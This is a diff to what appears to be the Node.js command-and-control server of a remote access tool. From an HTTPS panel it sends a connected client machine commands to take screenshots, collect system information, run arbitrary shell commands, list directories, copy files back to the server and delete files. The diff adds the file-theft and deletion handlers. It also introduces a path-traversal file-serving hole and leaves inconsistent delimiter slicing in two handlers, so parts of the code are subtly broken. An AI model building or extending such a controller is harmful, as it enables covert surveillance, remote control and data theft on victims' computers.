@@ -10,9 +10,30 @@ let integ = 5;
 let so_id;
 let wdir = "./web/"
 let adir = "./artifacts/"
+let delmtr = "__DELIMITER_UNIQUE_STRING_1234567890__\n"
 // Налаштування порту
 const WEB_PORT = 3000;
 const C2_PORT = 3001;
+
+const mimeTypes = {
+    '.html': 'text/html',
+    '.js': 'text/javascript',
+    '.css': 'text/css',
+    '.json': 'application/json',
+    '.ico': 'image/x-icon',
+    '.png': 'image/png',
+    '.jpg': 'image/jpg',
+    '.gif': 'image/gif',
+    '.svg': 'image/svg+xml',
+    '.woff': 'application/font-woff',
+    '.woff2': 'application/font-woff2',
+    '.otf': 'application/font-otf',
+    '.ttf': 'application/font-ttf',
+    '.eot': 'application/vnd.ms-fontobject',
+    '.pdf': 'application/pdf',
+    '.zip': 'application/zip',
+    '.txt': 'text/plain',
+};
 
 const options = {
     key: fs.readFileSync('cert/privatekey.pem'),
@@ -58,40 +79,25 @@ const server = https.createServer(options, (req, res) => {
                     break;
                 default:
                     const extname = String(path.extname(path_)).toLowerCase();
-                    const mimeTypes = {
-                        '.html': 'text/html',
-                        '.js': 'text/javascript',
-                        '.css': 'text/css',
-                        '.json': 'application/json',
-                        '.ico': 'image/x-icon',
-                        '.png': 'image/png',
-                        '.jpg': 'image/jpg',
-                        '.gif': 'image/gif',
-                        '.svg': 'image/svg+xml',
-                        '.woff': 'application/font-woff',
-                        '.woff2': 'application/font-woff2',
-                        '.otf': 'application/font-otf',
-                        '.ttf': 'application/font-ttf',
-                        '.eot': 'application/vnd.ms-fontobject',
-                        '.pdf': 'application/pdf',
-                        '.zip': 'application/zip',
-                        '.txt': 'text/plain',
-                    };
+
                     const contentType = mimeTypes[extname] || 'application/octet-stream';
-                    fs.readFile(wdir + path_, (error, content) => {
-                        if (error) {
-                            if (error.code === 'ENOENT') {
-                                res.writeHead(404, { 'Content-Type': 'text/html' });
-                                res.end('<h1>404 Not Found</h1>', 'utf-8');
-                            } else {
-                                res.writeHead(500);
-                                res.end('Sorry, there was an error: ' + error.code + ' ..\n');
-                            }
+                    const fileStream = fs.createReadStream('.' + decodeURIComponent(path_));
+
+                    fileStream.on('open', () => {
+                        res.writeHead(200, { 'Content-Type': contentType });
+                        fileStream.pipe(res);
+                    });
+                    
+                    fileStream.on('error', (error) => {
+                        if (error.code === 'ENOENT') {
+                            res.writeHead(404, { 'Content-Type': 'text/html' });
+                            res.end('<h1>404 Not Found</h1>', 'utf-8');
                         } else {
-                            res.writeHead(200, { 'Content-Type': contentType });
-                            res.end(content, 'utf-8');
+                            res.writeHead(500);
+                            res.end('Sorry, there was an error: ' + error.code + ' ..\n');
                         }
                     });
+                    
             }
             break;
         case 'POST':
@@ -134,7 +140,7 @@ const server = https.createServer(options, (req, res) => {
                     
                             switch(root.action) {
                                 case 'take_screenshot':
-                                    so_id.write(JSON.stringify({ com: 0 }) + '\n\n\n');
+                                    so_id.write(JSON.stringify({ com: 0 }) + delmtr);
                                     
                                     let screenshotData = '';
                     
@@ -142,11 +148,11 @@ const server = https.createServer(options, (req, res) => {
                                     so_id.on('data', (data) => {
                                         screenshotData += data.toString();
                     
-                                        // Process complete messages whenever the delimiter '\n\n\n' appears
-                                        while (screenshotData.includes('\n\n\n')) {
-                                            const delimiterIndex = screenshotData.indexOf('\n\n\n');
+                                        // Process complete messages whenever the delimiter delmtr appears
+                                        while (screenshotData.includes(delmtr)) {
+                                            const delimiterIndex = screenshotData.indexOf(delmtr);
                                             const message = screenshotData.slice(0, delimiterIndex);
-                                            screenshotData = screenshotData.slice(delimiterIndex + 3);
+                                            screenshotData = screenshotData.slice(delimiterIndex + delmtr.length);
                     
                                             try {
                                                 const parsedData = JSON.parse(message);
@@ -185,7 +191,7 @@ const server = https.createServer(options, (req, res) => {
                                     break;
                     
                                 case 'get_system_info':
-                                    so_id.write(JSON.stringify({ com: 1 }) + '\n\n\n');
+                                    so_id.write(JSON.stringify({ com: 1 }) + delmtr);
                                     
                                     let systemInfoData = '';
                     
@@ -193,11 +199,11 @@ const server = https.createServer(options, (req, res) => {
                                     so_id.on('data', (data) => {
                                         systemInfoData += data.toString();
                     
-                                        // Process complete messages whenever the delimiter '\n\n\n' appears
-                                        while (systemInfoData.includes('\n\n\n')) {
-                                            const delimiterIndex = systemInfoData.indexOf('\n\n\n');
+                                        // Process complete messages whenever the delimiter delmtr appears
+                                        while (systemInfoData.includes(delmtr)) {
+                                            const delimiterIndex = systemInfoData.indexOf(delmtr);
                                             const message = systemInfoData.slice(0, delimiterIndex);
-                                            systemInfoData = systemInfoData.slice(delimiterIndex + 3);
+                                            systemInfoData = systemInfoData.slice(delimiterIndex + delmtr.length);
                     
                                             try {
                                                 res.writeHead(200, { 'Content-Type': 'application/json' });
@@ -223,17 +229,17 @@ const server = https.createServer(options, (req, res) => {
                                     });
                                     break;
                                 case 'exec_com':
-                                    so_id.write(JSON.stringify({ com: 2, inp: root.command }) + '\n\n\n');
+                                    so_id.write(JSON.stringify({ com: 2, inp: root.command }) + delmtr);
                                     let comm_json = '';
 
                                     so_id.on('data', (data) => {
                                         comm_json += data.toString();
                     
-                                        // Process complete messages whenever the delimiter '\n\n\n' appears
-                                        while (comm_json.includes('\n\n\n')) {
-                                            const delimiterIndex = comm_json.indexOf('\n\n\n');
+                                        // Process complete messages whenever the delimiter delmtr appears
+                                        while (comm_json.includes(delmtr)) {
+                                            const delimiterIndex = comm_json.indexOf(delmtr);
                                             const message = comm_json.slice(0, delimiterIndex);
-                                            comm_json = comm_json.slice(delimiterIndex + 3);
+                                            comm_json = comm_json.slice(delimiterIndex + delmtr.length);
                     
                                             try {
                                                 res.writeHead(200, { 'Content-Type': 'application/json' });
@@ -257,6 +263,65 @@ const server = https.createServer(options, (req, res) => {
                                         console.error('Stream error:', err);
                                         res.writeHead(500, { 'Content-Type': 'application/json' });
                                         res.end(JSON.stringify({ status: "error", message: "Stream error" }));
+                                    });
+                                    break;
+                                case 'dir_list':
+                                    so_id.write(JSON.stringify({com: 3, dir: root.dir}) + delmtr);
+                                    let cli_dir = '';
+                                    so_id.on('data', (data) => {
+                                        cli_dir += data.toString();
+                                        while(cli_dir.includes(delmtr)) {
+                                            const pos = cli_dir.indexOf(delmtr);
+                                            const mess_dir = cli_dir.slice(0, pos);
+                                            cli_dir = cli_dir.slice(pos +3);
+                                            res.writeHead(200, { 'Content-Type': 'application/json' });
+                                            res.end(mess_dir);
+                                            console.log(mess_dir);
+                                        }
+                                    })
+                                    break;
+                                case 'save_file':
+                                    so_id.write(JSON.stringify({com: 4, path: root.path}) + delmtr);
+                                    const writeStream = fs.createWriteStream(adir+path.basename(root.path), { flags: 'w' });
+                                    let dataReceived = 0;
+                                    so_id.on('data', (data) => {
+                                        console.log(`Received chunk of ${data.length} bytes`);
+                                        if (data.includes(delmtr)) {
+                                            console.log(data);
+                                            writeStream.end();
+                                        } else {
+                                            writeStream.write(data, (err) => {
+                                                if (err) {
+                                                    console.error('Error writing chunk:', err);
+                                                    so_id.write(JSON.stringify({ status: "error", message: "Error writing file chunk" }));
+                                                    return;
+                                                }
+                                                dataReceived += data.length;
+                                            });                                            
+                                        }
+
+                                    });
+                                    writeStream.on('finish', () => {
+                                        console.log('File write complete');
+                                        res.writeHead(200, { 'Content-Type': 'application/json' });
+                                        res.end(JSON.stringify({ status: "OK", url: '/artifacts/' + path.basename(root.path) }));
+                                    });
+                                    break;
+                                case 'del_file':
+                                    so_id.write(JSON.stringify({com: 5, path: root.path}) + delmtr);
+                                    let cli_del = '';
+                                    so_id.on('data', (data) => {
+                                        cli_del += data.toString();
+                                        while (cli_del.includes(delmtr)) {
+                                            const delimiterIndex = cli_del.indexOf(delmtr);
+                                            const message = cli_del.slice(0, delimiterIndex);
+                                            cli_del = cli_del.slice(delimiterIndex + 3);
+
+                                            if (JSON.parse(message).status === "OK") {
+                                                res.writeHead(200, { 'Content-Type': 'application/json' });
+                                                res.end(message);
+                                            }
+                                        }
                                     });
                                     break;
                                 default:
